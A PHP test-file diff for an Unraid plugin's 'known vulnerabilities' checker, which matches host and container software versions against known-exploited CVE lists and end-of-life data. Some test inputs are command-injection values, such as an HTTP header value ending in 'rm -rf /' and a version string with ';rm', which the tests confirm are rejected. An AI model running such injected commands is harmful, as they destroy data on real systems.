+        && str_contains($line, '--max-filesize ' . WATCH_VULN_MAX['kev']) && str_contains($line, '-A ' . WATCH_VULN_UA) && str_contains($line, 'If-Modified-Since: Fri, 20 Nov 2026 17:48:39 GMT'));
+    $host = strtolower(trim(php_uname('n')));
+    check('vuln curl: no version, no host name, no id in what goes out', !str_contains($line, AGENT_VERSION) && ($host === '' || !str_contains(strtolower($line), $host))
+        && !preg_match('/X-Office|regGUID|Cookie/i', $line));
+    same('vuln curl: a Since that isn\'t a date — left out; an address that isn\'t https — refused', [false, 'bad_url'],
+        [in_array('If-Modified-Since: x"; rm -rf /', watchmanVulnCurl('https://example.org/', 1, 'x"; rm -rf /'), true), watchmanVulnGet('http://example.org/x', 1, null)['err']]);
+    same('vuln curl: its answer — body, code, Last-Modified; a failure', [[200, '{"a":1}', 'Fri, 20 Nov 2026 17:48:39 GMT', null], [0, '', null]],
+        [array_values(watchmanVulnAnswer(0, "{\"a\":1}\n200\nFri, 20 Nov 2026 17:48:39 GMT")), array_slice(array_values(watchmanVulnAnswer(6, '', 'Could not resolve host')), 0, 3)]);
+
+    // what is here: Unraid's version, the kernel, PHP, Slackware's packages
+    @mkdir("$tmp/packages", 0700);
+    foreach (['sudo-1.9.16p2-x86_64-1', 'openssh-10.0p2-x86_64-1', 'samba-4.22.5-x86_64-1', 'aaa_base-16.0-x86_64-1', 'bash-5.3.003-x86_64-1'] as $pkg) {
+        touch("$tmp/packages/$pkg");
+    }
+    file_put_contents("$tmp/unraid-version", "version=\"7.4.1\"\n");
+    $paths = ['unraid_version' => "$tmp/unraid-version", 'packages' => "$tmp/packages", 'kernel' => '6.12.24-Unraid', 'php' => '8.3.4'];
+    $inv = watchmanVulnInventory($paths);
+    same('vuln inventory: Unraid, the kernel, PHP, the packages the name table knows', [['unraid', '7.4.1'], ['kernel', '6.12.24'], ['php', '8.3.4'], ['bash', '5.3.003'], ['openssh', '10.0p2'],
+        ['samba', '4.22.5'], ['sudo', '1.9.16p2']], (function () use ($inv) {
+            $x = array_map(fn ($i) => [$i['product'], $i['clean']], $inv);
+            $head = array_slice($x, 0, 3);
+            $rest = array_slice($x, 3);
+            sort($rest);
+            return [...$head, ...$rest];
+        })());
+
+    // judged: the kernel affected (fixed 6.12.48), PHP not (Windows only), Unraid not (released years after the entry), sudo gone from the list
+    $j = watchmanVulnJudge($dir, $inv, $t0 + 3 * 86400);
+    same('vuln judge: the kernel affected with its fix; PHP (Windows only) and Unraid 7.4.1 (released long after a 2021 entry) checked, not affected; the lists fresh',
+        [[['CVE-2024-1086', 'kernel', 'yes', '6.12.24-Unraid', '6.12.48']], 2, true, ['version' => '7.4.1', 'status' => 'supported', 'newest' => '7.4.1']],
+        [array_map(fn ($x) => [$x['cve'], $x['product'], $x['verdict'], $x['have'], $x['fixed']], $j['found']), $j['checked'], $j['fresh'], $j['unraid']]);
+    same('vuln judge: the two checked and not affected listed for his page (1.96 «einfacher»: what runs here, the vulnerability)',
+        [['CVE-2024-4577', 'php', '8.3.4'], ['CVE-2020-5847', 'unraid', '7.4.1']],
+        (function () use ($j) { $x = array_map(fn ($n) => [$n['cve'], $n['product'], $n['have']], $j['not']); usort($x, fn ($a, $b) => strcmp($a[1], $b[1])); return $x; })());
+    $j2 = watchmanVulnJudge($dir, [['product' => 'unraid', 'version' => '7.3.0-beta.2', 'clean' => null, 'where' => 'host']], $t0 + 3 * 86400);
+    same('vuln judge: a version that doesn\'t compare (a beta) — can\'t be checked for sure: the calm list, never found (1.96, 2026-11-23)',
+        [[], [['CVE-2020-5847', 'unraid', '7.3.0-beta.2']]], [$j2['found'], array_map(fn ($x) => [$x['cve'], $x['product'], $x['have']], $j2['unsure'])]);
+    same('vuln judge: the lists older than three days — not fresh («not checked», never «all fine»)', false, watchmanVulnJudge($dir, $inv, $t0 + 8 * 86400)['fresh']);
+
+    // the book: one entry a vulnerability, product and place; told only when affected; its words
+    $book = [];
+    // a «maybe» handed in (an older judge's shape) is never an entry: only «affected» is (1.96, 2026-11-23)
+    $found = [...$j['found'], ['cve' => 'CVE-2020-5847', 'product' => 'unraid', 'where' => 'host', 'verdict' => 'maybe', 'have' => '7.3.0-beta.2',
+              'fixed' => null, 'name' => 'x', 'ransom' => false, 'added' => null]];
+    same('vuln book: vuln_known (told); a «maybe» never an entry', [['vuln_known'], true, 1],
+        [watchmanVulnCompare($book, $found, $t0), WATCH_KINDS['vuln_known'][1], count($book)]);
+    $book[0]['noted'] = $t0 + 10;
+    same('vuln book: seen again (noted or not) — no second entry', [[], 1], [watchmanVulnCompare($book, $found, $t0 + 300), count($book)]);
+    // gap 3 (concept 12.1): a KEV entry whose record wasn't fetched (or tried) yet is never judged; what isn't found any
+    // more closes; a line gone from the book (pruned, his history) never comes back while still found
+    $kev = readJson(watchmanVulnDir($dir) . '/kev.json');
+    $kev2 = $kev;
+    $kev2['entries'][] = ['cve' => 'CVE-2099-0001', 'product' => 'kernel', 'name' => 'x', 'added' => '2099-01-01', 'ransom' => false, 'desc' => ''];
+    writeAtomic(watchmanVulnDir($dir) . '/kev.json', jsonEncode($kev2), 0600, 0, 0);
+    $jp = watchmanVulnJudge($dir, $inv, $t0 + 3 * 86400);
+    writeAtomic(watchmanVulnDir($dir) . '/cve-tried.json', jsonEncode(['CVE-2099-0001' => $t0]), 0600, 0, 0);
+    $jt = watchmanVulnJudge($dir, $inv, $t0 + 3 * 86400);
+    @unlink(watchmanVulnDir($dir) . '/cve-tried.json');
+    writeAtomic(watchmanVulnDir($dir) . '/kev.json', jsonEncode($kev), 0600, 0, 0);
+    same('vuln judge: a record not fetched yet — not judged (pending, never «maybe»); asked and not had — judged without it (can\'t be checked for sure)',
+        [['CVE-2099-0001'], false, false, true],
+        [$jp['pending'], in_array('CVE-2099-0001', array_column($jp['unsure'], 'cve'), true), in_array('CVE-2099-0001', array_column($jt['found'], 'cve'), true),
+         in_array('CVE-2099-0001', array_column($jt['unsure'], 'cve'), true)]);
+    $vb = [];
+    $vs = [];
+    watchmanVulnCompare($vb, $found, $t0, $vs, true);
+    $vb[0]['noted'] = $t0 + 10;
+    $vb[0]['by'] = 'page';
+    $kept = $vb;
+    $vb = [];                                           // the noted one gone from the book (90 days, his history)
+    same('vuln book: a noted one gone from the book, still found — no second entry, nothing told', [[], 0],
+        [watchmanVulnCompare($vb, $found, $t0 + 91 * 86400, $vs, true), count($vb)]);
+    $vb2 = $kept;
+    watchmanVulnCompare($vb2, [$found[0]], $t0 + 400, $vs, true, ['CVE-2099-0001']);
+    same('vuln book: the lists fresh — your noted line stays yours', 'page', $vb2[0]['by']);
+    $vb3 = [watchmanEntry('vuln_known', 'vuln_known:CVE-2024-1086:kernel:host', $t0, ['cve' => 'CVE-2024-1086'])];
+    watchmanVulnCompare($vb3, [], $t0 + 500, $vs, true, ['CVE-2024-1086']);
+    watchmanVulnCompare($vb3, [], $t0 + 600, $vs, false);
+    same('vuln book: never closed while its record is still to come, nor while the lists are old', true, watchmanOpen($vb3[0]));
+    watchmanVulnCompare($vb3, [], $t0 + 700, $vs, true);
+    same('vuln book: gone — closed (by himself, resolved); found again later — news again', [false, 'auto', ['vuln_known']],
+        [watchmanOpen($vb3[0]), $vb3[0]['by'], watchmanVulnCompare($vb3, [$found[0]], $t0 + 800, $vs, true)]);
+    same('vuln book: its words — the fixed version; the area', ['entry.vuln_known_fixed', ['cve' => 'CVE-2024-1086', 'product' => 'Linux kernel', 'have' => '6.12.24-Unraid',
+        'fixed' => '6.12.48', 'name' => 'Linux Kernel Use-After-Free Vulnerability', 'where' => ''], 'vuln'], [watchmanEntryKey($book[0]), watchmanText($book[0]), watchmanCatOf('vuln_known')]);
+    // an older office's open «maybe» lines (39 kernel CVEs on nostromo, 2026-11-23): closed quietly at the next round —
+    // by himself, nothing told, their keys gone from what he has seen; a closed one stays as it was; your own noted one too
+    $old = [watchmanEntry('vuln_maybe', 'vuln_maybe:CVE-2010-3904:kernel:host', $t0, ['cve' => 'CVE-2010-3904', 'product' => 'kernel', 'where' => 'host']),
+            watchmanEntry('vuln_maybe', 'vuln_maybe:CVE-2014-6278:bash:host', $t0, ['cve' => 'CVE-2014-6278', 'product' => 'bash', 'where' => 'host']) + ['important' => true],
+            array_merge(watchmanEntry('vuln_maybe', 'vuln_maybe:CVE-2016-5195:kernel:host', $t0, ['cve' => 'CVE-2016-5195']), ['noted' => $t0 + 5, 'by' => 'page'])];
+    $os = ['vuln_maybe:CVE-2010-3904:kernel:host' => $t0, 'vuln_known:CVE-2024-1086:kernel:host' => $t0];
+    same('vuln book: an older office\'s open «maybe» lines — closed quietly (by himself, nothing told, forgotten as seen); yours kept',
+        [[], [false, 'auto'], [false, 'auto'], [false, 'page', $t0 + 5], ['vuln_known:CVE-2024-1086:kernel:host']],
+        [watchmanVulnCompare($old, [], $t0 + 900, $os, false), [watchmanOpen($old[0]), $old[0]['by']], [watchmanOpen($old[1]), $old[1]['by']],
+         [watchmanOpen($old[2]), $old[2]['by'], $old[2]['noted']], array_keys($os)]);
+    $old2 = [watchmanEntry('vuln_maybe', 'vuln_maybe:CVE-2010-3904:kernel:host', $t0, ['cve' => 'CVE-2010-3904'])];
+    watchmanVulnMaybeClose($old2, $t0 + 950);
+    same('vuln book: switched off — the «maybe» lines go quietly all the same (watchmanVulnMaybeClose)', [false, 'auto'], [watchmanOpen($old2[0]), $old2[0]['by']]);
+    same('vuln page: «can\'t be checked for sure» with its product\'s name; counted as maybe; an older state without it: none',
+        [[['CVE-2020-5847', 'Unraid']], 1, []],
+        [array_map(fn ($x) => [$x['cve'], $x['label']], watchmanVulnPage(['vuln_on' => true], $j2)['unsure']), watchmanVulnPage(['vuln_on' => true], $j2)['maybe'],
+         watchmanVulnPage(['vuln_on' => true], ['found' => []])['unsure']]);
+
+    // Unraid's advice: eol or superseded
+    $tips = [];
+    $add = function (string $id, array $p, string $about, ?array $link) use (&$tips): void { $tips[$id] = [$p, $link['path'] ?? null]; };
+    watchmanVulnTips(['unraid' => ['version' => '7.2.3', 'status' => 'eol', 'newest' => '7.4.1']], $add);
+    watchmanVulnTips(['unraid' => ['version' => '7.4.1', 'status' => 'supported', 'newest' => '7.4.1']], fn () => check('vuln tip: a supported version — none', false));
+    same('vuln tip: Unraid without security updates — the advice, its area, to Update OS', [[['version' => '7.2.3', 'status' => 'eol', 'newest' => '7.4.1'], '/Tools/Update'], 'advice', 'vuln'],
+        [$tips['unraid_eol'] ?? null, WATCH_POSTURE['unraid_eol'], watchmanCatOfTip('unraid_eol')]);
+
+    // the switch, due once a day, the light
+    $wd = "$tmp/w";
+    @mkdir($wd, 0700);
+    same('vuln switch: only true or false; off by default; on and off kept', ['bad_request', false, true, false], (function () use ($wd) {
+        try {
+            watchmanVulnSet('yes', $wd, false);
+            $e = 'none';
+        } catch (Problem $p) {
+            $e = $p->key;
+        }
+        $a = (watchmanLoad($wd)['state']['vuln_on'] ?? false);
+        watchmanVulnSet(true, $wd, false);
+        $b = watchmanLoad($wd)['state']['vuln_on'];
+        watchmanVulnSet(false, $wd, false);
+        return [$e, $a, $b, watchmanLoad($wd)['state']['vuln_on']];
+    })());
+    same('vuln due: off never; on — never tried, a day after, a failure not before the next day (its back-off), a clock set back', [false, true, false, true, false, false, true],
+        [watchmanVulnDue(['vuln_on' => false], null, $t0), watchmanVulnDue(['vuln_on' => true], null, $t0),
+         watchmanVulnDue(['vuln_on' => true], ['kev' => ['try' => $t0]], $t0 + 3600), watchmanVulnDue(['vuln_on' => true], ['kev' => ['try' => $t0]], $t0 + 86400),
+         watchmanVulnDue(['vuln_on' => true], ['kev' => ['try' => $t0, 'err' => 'x']], $t0 + 3600), watchmanVulnDue(['vuln_on' => true], ['kev' => ['try' => $t0, 'err' => 'x']], $t0 + 6 * 3600),
+         watchmanVulnDue(['vuln_on' => true], ['kev' => ['try' => $t0]], $t0 - 100)]);
+    $light = fn (?array $v, array $book = []) => watchmanCats(['hired' => 1, 'on_watch' => 1, 'round' => ['time' => $t0], 'book' => $book, 'vuln' => $v, 'time' => $t0])['areas']['vuln'];
+    $open = fn (string $kind, bool $tell) => ['id' => 'x', 'kind' => $kind, 'open' => true, 'tell' => $tell, 'last' => $t0];
+    same('vuln light: off grey; on, never fetched «!»; lists old «!»; fresh, nothing open green; a maybe yellow; affected red',
+        [['none', ['vuln_off']], ['note', ['vuln_never']], ['note', ['vuln_old']], ['ok', []], ['warn', ['open']], ['danger', ['open_tell']]],
+        array_map(fn ($l) => [$l['level'], $l['why']], [$light(null), $light(['on' => true, 'checked_at' => null]), $light(['on' => true, 'checked_at' => $t0 - 5 * 86400, 'fresh' => false]),
+            $light(['on' => true, 'checked_at' => $t0, 'fresh' => true]), $light(['on' => true, 'checked_at' => $t0, 'fresh' => true], [$open('vuln_maybe', false)]),
+            $light(['on' => true, 'checked_at' => $t0, 'fresh' => true], [$open('vuln_known', true)])]));
+    same('vuln page: the switch, freshness, counts', ['on' => true, 'since' => null, 'checked_at' => $t0, 'fresh' => true, 'checked' => 2, 'affected' => 1, 'maybe' => 0],
+        array_diff_key(watchmanVulnPage(['vuln_on' => true], ['kev' => $t0, 'fresh' => true, 'checked' => 2, 'found' => [['verdict' => 'yes']]]), ['software' => 1, 'unknown' => 1, 'not' => 1, 'unsure' => 1, 'kev_total' => 1, 'kev_here' => 1, 'kev_products' => 1, 'pending' => 1, 'floor' => 1, 'down' => 1, 'routers' => 1,
+            'host' => 1, 'cts' => 1, 'ct_total' => 1, 'ct_read' => 1, 'unread' => 1, 'unread_n' => 1, 'vms' => 1, 'ghsa' => 1, 'ghsa_here' => 1]));
+    // 1.96 «einfacher»: «Checked: doesn't concern you» — what runs here, the vulnerability, fixed from; an older state has none
+    same('vuln page: the list «checked, doesn\'t concern you» (only exactly-shaped lines); none in an older state',
+        [[['cve' => 'CVE-2024-4577', 'product' => 'php', 'where' => 'host', 'have' => '8.5.12', 'fixed' => '8.5.12', 'name' => 'x', 'label' => 'PHP']], []],
+        [watchmanVulnPage(['vuln_on' => true], ['not' => [['cve' => 'CVE-2024-4577', 'product' => 'php', 'where' => 'host', 'have' => '8.5.12', 'fixed' => '8.5.12', 'name' => 'x'], 'junk', ['cve' => 7]]])['not'],
+         watchmanVulnPage(['vuln_on' => true], ['kev' => $t0])['not']]);
+
+    // a whole round: off — nothing judged; on — the kernel's entry in book-more.json, the page says so; the night shift never
+    $data = "$tmp/round";
+    $src = "$tmp/src";
+    foreach (['plugins', 'extra', 'ssh'] as $d2) {
+        @mkdir("$src/$d2", 0700, true);
+    }
+    $rp = $paths + ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+                    'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd"];
+    file_put_contents($rp['syslog'], '');
+    file_put_contents($rp['go'], "#!/bin/bash\n");
+    file_put_contents($rp['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($rp['shadow'], "root:*:20000:0:99999:7:::\n");
+    $docker = fn () => [];
+    watchmanRound($rp, $data, 1000, $t0 + 3 * 86400, $docker, false, "$tmp/acks.json");
+    exec('cp -R ' . escapeshellarg($f) . ' ' . escapeshellarg("$data/feeds"));
+    watchmanRound($rp, $data, 1000, $t0 + 3 * 86400 + 300, $docker, false, "$tmp/acks.json");
+    same('vuln round: off — nothing judged, no entry', [[], null], [array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => str_starts_with($e['kind'], 'vuln_'))),
+        watchmanLoad($data)['state']['vuln_look'] ?? null]);
+    watchmanVulnSet(true, $data, false);
+    watchmanRound($rp, $data, 1000, $t0 + 3 * 86400 + 600, $docker, false, "$tmp/acks.json");
+    $d = watchmanLoad($data);
+    $ps = watchmanPageState($data, $t0 + 3 * 86400 + 600, false);
+    same('vuln round: on — the kernel\'s entry, in book-more.json; the page\'s counts and light',
+        [['vuln_known:CVE-2024-1086:kernel:host'], ['vuln_known'], ['on' => true, 'fresh' => true, 'checked' => 2, 'affected' => 1, 'maybe' => 0], 'danger'],
+        [array_column(array_filter($d['book'], fn ($e) => str_starts_with($e['kind'], 'vuln_')), 'key'), array_column(readJson("$data/book-more.json")['entries'] ?? [], 'kind'),
+         array_intersect_key($ps['vuln'], array_flip(['on', 'fresh', 'checked', 'affected', 'maybe'])), $ps['cats']['vuln']['level'] ?? null]);
+    same('vuln round: the night shift has neither the version file nor the packages', [false, false], [isset(watchmanNightPaths()['unraid_version']), isset(watchmanNightPaths()['packages'])]);
+    hardeningRm($tmp);
+}
+
+/**
+ * «Known vulnerabilities», software in containers (1.96, concept 11.3 A part 2, step 16): the images' own ENV — docker's
+ * format emits only the fixed …_VERSION names (WATCH_VULN_ENV); the parser keeps only those, in a version's shape
+ * (another variable on the line, a password: never kept, never in his state); asked at most hourly or when the images
+ * change; the official images' spellings (MariaDB's epoch and suffix, PostgreSQL's package revision, Temurin's «jdk-»);
+ * endoflife.date's fixed slugs fetched with the lists; each container's release line, past its end (the advice
+ * software_eol) or behind its newest release; an image naming none of them: «version unknown»; a container's PHP judged
+ * like the host's (entry.vuln_known_ct_fixed); a whole round. Docker 29 (2026-11-25): an image without labels fails the
+ * label's template — the environment is asked without it, the label only of «unifi» images; an image docker didn't answer
+ * (an error line, exit ≠ 0, a line missing) is unknown alone, never blinds the others, never shifts their versions.
+ */
+function testWatchmanVulnSoftware(): void
+{
+    $tmp = hardeningTmp('watch-vuln-sw');
+    $fmt = watchmanVulnImagesFormat();
+    check('vuln images: the format names exactly the fixed names, nothing else of the environment; never the labels (Docker 29 fails an image without)',
+        str_contains($fmt, '{{if eq $k "PHP_VERSION" "NGINX_VERSION" "MARIADB_VERSION" "PG_VERSION" "REDIS_VERSION" "NODE_VERSION" "PYTHON_VERSION" "GOLANG_VERSION" "JAVA_VERSION" "UNIFI_VERSION"'
+            . ' "NEXTCLOUD_VERSION" "MONGO_VERSION" "HTTPD_VERSION" "TOMCAT_VERSION" "JENKINS_VERSION" "ZBX_VERSION" "ROUNDCUBEMAIL_VERSION" "VALKEY_VERSION" "N8N_VERSION"}}')
+        && str_starts_with($fmt, '{{.Id}}') && !str_contains($fmt, 'Labels'));
+    same('vuln images: of the labels only the OCI version, in a query of its own', '{{.Id}}{{with .Config.Labels}}{{with index . "org.opencontainers.image.version"}} OCI_VERSION={{.}}{{end}}{{end}}',
+        watchmanVulnImagesLabelFormat());
+    $env = ['php:8.1' => 'sha256:aaa PHP_VERSION=8.1.31 PASSWORD=hunter2 MARIADB_VERSION=1:11.8.9+maria~ubu2404', 'linuxserver/plex' => 'sha256:bbb',
+            'postgres:17' => 'sha256:ccc PG_VERSION=17.12-1.pgdg12+1 JAVA_VERSION=jdk-21.0.13.1+2 PHP_VERSION=8.4.x;rm OCI_VERSION=17'];
+    same('vuln images: by image — only the fixed names in a version\'s shape (a password, a value with ;, OCI_VERSION in the environment never kept); no answer: unknown',
+        ['php:8.1' => ['PHP_VERSION' => '8.1.31', 'MARIADB_VERSION' => '1:11.8.9+maria~ubu2404'], 'linuxserver/plex' => [], 'postgres:17' => ['PG_VERSION' => '17.12-1.pgdg12+1', 'JAVA_VERSION' => 'jdk-21.0.13.1+2'],
+         'redis:8' => []],
+        watchmanVulnImagesParse($env, [], ['php:8.1', 'linuxserver/plex', 'postgres:17', 'redis:8']));
+    same('vuln images: the label line gives only OCI_VERSION, only to an image named «unifi» with the same id',
+        [['UNIFI_VERSION' => '8.6.9', 'OCI:unifi' => '9.0.1'], [], []],
+        array_values(watchmanVulnImagesParse(['jacobalberty/unifi:v8' => 'sha256:u1 UNIFI_VERSION=8.6.9', 'my/unifi:2' => 'sha256:u2'],
+            ['jacobalberty/unifi:v8' => 'sha256:u1 OCI_VERSION=9.0.1 PHP_VERSION=8.1.1 PASSWORD=x', 'my/unifi:2' => 'sha256:other OCI_VERSION=1.0', 'php:8.1' => 'sha256:aaa OCI_VERSION=8'],
+            ['jacobalberty/unifi:v8', 'my/unifi:2', 'php:8.1'])));
+    same('vuln images: the official spellings, cleaned', ['11.8.9', '17.12', '21.0.13.1', '22.23.5', '8.4.28', null],
+        [watchmanVulnClean('1:11.8.9+maria~ubu2404', 'env'), watchmanVulnClean('17.12-1.pgdg12+1', 'env'), watchmanVulnClean('jdk-21.0.13.1+2', 'env'),
+         watchmanVulnClean('22.23.5', 'env'), watchmanVulnClean('8.4.28', 'env'), watchmanVulnClean('latest', 'env')]);
+
+    // asked at most hourly, or when the images change; Docker silent: nothing
+    $t0 = strtotime('2026-11-22 12:00:00');
+    $calls = 0;
+    $inspect = function (array $refs, string $format) use (&$calls): array {
+        $calls++;
+        $map = ['php:8.1' => 'sha256:aaa PHP_VERSION=8.1.31 PASSWORD=hunter2', 'php:8.4' => 'sha256:ddd PHP_VERSION=8.3.4', 'linuxserver/plex' => 'sha256:bbb',
+                'postgres:17' => 'sha256:ccc PG_VERSION=17.12-1.pgdg12+1'];
+        return [0, implode("\n", array_map(fn ($r) => $map[$r] ?? 'sha256:zzz', $refs)) . "\n"];
+    };
+    $cts = ['nextcloud' => ['image' => 'php:8.1'], 'web' => ['image' => 'php:8.4'], 'plex' => ['image' => 'linuxserver/plex'], 'db' => ['image' => 'postgres:17']];
+    [$by, $cache] = watchmanVulnImages($cts, null, $t0, $inspect);
+    [, $cache2] = watchmanVulnImages($cts, $cache, $t0 + 600, $inspect);
+    [, $cache3] = watchmanVulnImages($cts + ['new' => ['image' => 'php:8.1']], $cache2, $t0 + 900, $inspect);
+    [, $cache4] = watchmanVulnImages($cts + ['other' => ['image' => 'redis:8']], $cache3, $t0 + 1000, $inspect);
+    [, $cache5] = watchmanVulnImages($cts + ['other' => ['image' => 'redis:8']], $cache4, $t0 + 1000 + 3600, $inspect);
+    // (2026-11-26: each ask is two calls — the environment, and the label of linuxserver/plex, Plex's own place for its version)
+    same('vuln images: per container; asked once, again only for other images or after an hour; Docker silent — nothing',
+        [['nextcloud' => ['PHP_VERSION' => '8.1.31'], 'web' => ['PHP_VERSION' => '8.3.4'], 'plex' => [], 'db' => ['PG_VERSION' => '17.12-1.pgdg12+1']], 6, [[], null]],
+        [$by, $calls, watchmanVulnImages(null, null, $t0, $inspect)]);
+    check('vuln images: no other value of an environment kept', !str_contains(json_encode([$cache, $cache5]), 'hunter2') && !str_contains(json_encode($by), 'PASSWORD'));
+
+    // Docker 29 (2026-11-25): an image without labels has no «Labels» key — the label's template fails for it; docker
+    // prints the lines it could, an error for the others, exits ≠ 0. One image never blinds the others, never shifts them.
+    $box = ['php:7.2.20-fpm-alpine' => ['sha256:p72', ['PHP_VERSION=7.2.20', 'PHPIZE_DEPS=autoconf', 'MYSQL_PASSWORD=hunter2'], null],
+            'valkey/valkey:8-bookworm' => ['sha256:vk8', ['VALKEY_VERSION=8.1.4'], null],
+            'lscr.io/linuxserver/unifi-network-application:latest' => ['sha256:ls9', ['PATH=/usr/bin'], ['org.opencontainers.image.version' => '9.0.114-ls78', 'maintainer' => 'secret']],
+            'my/unifi-nolabel:1' => ['sha256:un1', ['UNIFI_VERSION=8.6.9'], null],
+            'postgres:17' => ['sha256:pg7', ['PG_VERSION=17.12-1.pgdg12+1', 'POSTGRES_PASSWORD=hunter2'], ['org.opencontainers.image.version' => '17']]];
+    $asked = [];
+    $docker29 = function (array $refs, string $format) use ($box, &$asked): array {
+        $asked[] = [count($refs), str_contains($format, 'Labels')];
+        $out = '';
+        $exit = 0;
+        foreach ($refs as $r) {
+            if (!isset($box[$r])) {
+                $out .= "Error: No such image: $r\n";              // as if stderr came along: never a line of an image
+                $exit = 1;
+            } elseif (str_contains($format, '.Config.Labels') && $box[$r][2] === null) {
+                $out .= "template parsing error: template: :1:8: executing \"\" at <.Config.Labels>: map has no entry for key \"Labels\"\n";
+                $exit = 1;
+            } else {
+                $line = $box[$r][0];
+                foreach (str_contains($format, '.Config.Labels') ? [] : $box[$r][1] as $e) {
+                    $k = explode('=', $e, 2)[0];
+                    $line .= in_array($k, WATCH_VULN_ENV, true) ? " $e" : '';
+                }
+                $v = $box[$r][2]['org.opencontainers.image.version'] ?? null;
+                $out .= $line . (str_contains($format, '.Config.Labels') && $v !== null ? " OCI_VERSION=$v" : '') . "\n";
+            }
+        }
+        return [$exit, $out];
+    };
+    $cts29 = ['php' => ['image' => 'php:7.2.20-fpm-alpine'], 'cache' => ['image' => 'valkey/valkey:8-bookworm'],
+              'unifi' => ['image' => 'lscr.io/linuxserver/unifi-network-application:latest'], 'unifi2' => ['image' => 'my/unifi-nolabel:1'],
+              'db' => ['image' => 'postgres:17']];
+    [$by29, $cache29] = watchmanVulnImages($cts29, null, $t0, $docker29);
+    same('vuln images, Docker 29: images without labels among others — every environment read, the unifi label still read, one call each',
+        [['php' => ['PHP_VERSION' => '7.2.20'], 'cache' => ['VALKEY_VERSION' => '8.1.4'], 'unifi' => ['OCI:unifi' => '9.0.114-ls78'], 'unifi2' => ['UNIFI_VERSION' => '8.6.9'],
+          'db' => ['PG_VERSION' => '17.12-1.pgdg12+1']], [[5, false], [2, true], [1, true], [1, true]]],
+        [$by29, $asked]);
+    check('vuln images, Docker 29: nothing but the allowed names kept (no password, no other label)',
+        !preg_match('/hunter2|PASSWORD|PHPIZE|secret|maintainer|PATH/', (string) json_encode([$by29, $cache29])));
+    $asked = [];
+    [$byGone] = watchmanVulnImages($cts29 + ['old' => ['image' => 'gone/meanwhile:1']], null, $t0, $docker29);
+    same('vuln images: one image gone meanwhile (an error line, exit ≠ 0) — the others asked one by one, each its own version; the gone one unknown',
+        [['php' => ['PHP_VERSION' => '7.2.20'], 'cache' => ['VALKEY_VERSION' => '8.1.4'], 'unifi' => ['OCI:unifi' => '9.0.114-ls78'], 'unifi2' => ['UNIFI_VERSION' => '8.6.9'],
+          'db' => ['PG_VERSION' => '17.12-1.pgdg12+1'], 'old' => []], [[6, false]]],
+        [$byGone, array_slice($asked, 0, 1)]);
+    // a line missing though docker said 0: never paired by position (the versions would slide to the next image)
+    $short = function (array $refs, string $format): array {
+        $map = ['a/one:1' => 'sha256:111 PHP_VERSION=8.1.1', 'b/two:1' => 'sha256:222 PHP_VERSION=8.2.2', 'c/three:1' => 'sha256:333 PHP_VERSION=8.3.3'];
+        $lines = array_map(fn ($r) => $map[$r], $refs);
+        return [0, implode("\n", count($refs) > 1 ? array_values(array_diff($lines, [$map['a/one:1']])) : $lines) . "\n"];
+    };
+    same('vuln images: a missing line never shifts the versions to another image',
+        ['a/one:1' => ['PHP_VERSION' => '8.1.1'], 'b/two:1' => ['PHP_VERSION' => '8.2.2'], 'c/three:1' => ['PHP_VERSION' => '8.3.3']],
+        watchmanVulnImagesParse(watchmanVulnImagesAsk(['a/one:1', 'b/two:1', 'c/three:1'], watchmanVulnImagesFormat(), $short), [], ['a/one:1', 'b/two:1', 'c/three:1']));
+    $n = 0;
+    $silent = function () use (&$n): array {
+        $n++;
+        return [1, "Cannot connect to the Docker daemon\n"];
+    };
+    same('vuln images: Docker silent — no line, every image unknown, not a call for each', [['a' => [], 'b' => []], 1],
+        [watchmanVulnImages(['a' => ['image' => 'x:1'], 'b' => ['image' => 'y:1']], null, $t0, $silent)[0], $n]);
+
+    // the lists: endoflife.date's fixed slugs with the others; the containers' lines
+    $dir = "$tmp/data";
+    @mkdir($dir, 0700, true);
+    $eolBody = fn (array $cycles) => json_encode(['schema_version' => '1.2.1', 'result' => ['name' => 'x', 'releases' => $cycles]]);
+    $cycle = fn (string $n, bool $eol, string $latest) => ['name' => $n, 'releaseDate' => '2022-01-01', 'isEol' => $eol, 'eolFrom' => $eol ? '2025-12-31' : '2028-12-31',
+        'isMaintained' => !$eol, 'latest' => ['name' => $latest, 'date' => '2026-11-19']];
+    $answers = [WATCH_VULN_URLS['eol'] . 'php' => $eolBody([$cycle('8.4', false, '8.4.28'), $cycle('8.3', false, '8.3.30'), $cycle('8.1', true, '8.1.34')]),
+                WATCH_VULN_URLS['eol'] . 'postgresql' => $eolBody([$cycle('17', false, '17.12'), $cycle('13', true, '13.22')])];
+    $kevList = [['cveID' => 'CVE-2024-4577', 'vendorProject' => 'PHP Group', 'product' => 'PHP', 'vulnerabilityName' => 'PHP-CGI OS Command Injection Vulnerability', 'dateAdded' => '2024-06-12']];
+    for ($i = 0; $i < 120; $i++) {
+        $kevList[] = ['cveID' => sprintf('CVE-2023-%05d', 10000 + $i), 'vendorProject' => 'Example Corp', 'product' => "Router $i"];
+    }
+    $answers[WATCH_VULN_URLS['kev']] = json_encode(['catalogVersion' => '2026.11.20', 'count' => count($kevList), 'vulnerabilities' => $kevList]);
+    $answers[watchmanVulnCveUrl('CVE-2024-4577')] = json_encode(['cveMetadata' => ['cveId' => 'CVE-2024-4577'], 'containers' => ['cna' => ['affected' => [
+        ['vendor' => 'PHP Group', 'product' => 'PHP', 'defaultStatus' => 'affected', 'versions' => [['version' => '8.1.*', 'lessThan' => '8.1.29', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '8.3.*', 'lessThan' => '8.3.8', 'status' => 'affected', 'versionType' => 'semver']]]]]]]);
+    $answers[WATCH_VULN_URLS['unraid']] = json_encode([['version' => '7.4.1', 'supportStatus' => 'supported', 'date' => '2026-11-10']]);
+    $asked = [];
+    $get = function (string $url, ?string $since) use (&$asked, $answers): array {
+        $asked[] = $url;
+        return isset($answers[$url]) ? ['code' => 200, 'body' => $answers[$url], 'lm' => null, 'err' => null] : ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+    };
+    watchmanVulnFetch($dir, ['get' => $get, 'now' => $t0]);
